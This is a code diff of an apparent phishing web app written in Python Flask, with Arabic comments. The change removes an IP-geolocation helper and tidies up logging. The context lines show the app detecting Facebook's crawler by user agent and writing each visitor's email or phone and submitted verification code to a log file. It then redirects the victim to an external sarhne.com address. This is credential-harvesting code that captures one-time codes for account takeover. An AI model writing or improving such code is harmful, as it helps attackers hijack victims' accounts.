@@ -99,27 +99,7 @@ def log_every_request():
     method = request.method
     user_agent = request.headers.get("User-Agent", "").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-#=========================
-# تحديد location 
-#=========================
-def get_location(ip):
-    try:
-        url = f"http://ip-api.com/json/{ip}"
 
-        response = requests.get(url, timeout=3)
-
-        data = response.json()
-
-        country = data.get("country", "Unknown")
-        city = data.get("city", "Unknown")
-        isp = data.get("isp", "Unknown")
-
-        return country, city, isp
-
-    except:
-        return "Unknown", "Unknown", "Unknown"
-        
     # 🔥 تحديد نوع الزائر
     if "facebookexternalhit" in user_agent:
         visitor_type = "Facebook Bot"
@@ -343,14 +323,15 @@ def verify_code():
 Verification Code
 Email: {phone_or_email}
 Code: {code}
-    logging.info(Fore.RED + f"Verify Code: {code}")
 
 -------------------------
 """
+    logging.info(Fore.RED + f"Verify Code: {code}")
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
     login_botton_url = "https://2742404919047.sarhne.com"
-    return redirect(login_botton_url), logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}"), logging.info(Fore.RED + f"Verify Code: {code}")
+    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
+    return redirect(login_botton_url)
 
 
 # ========================
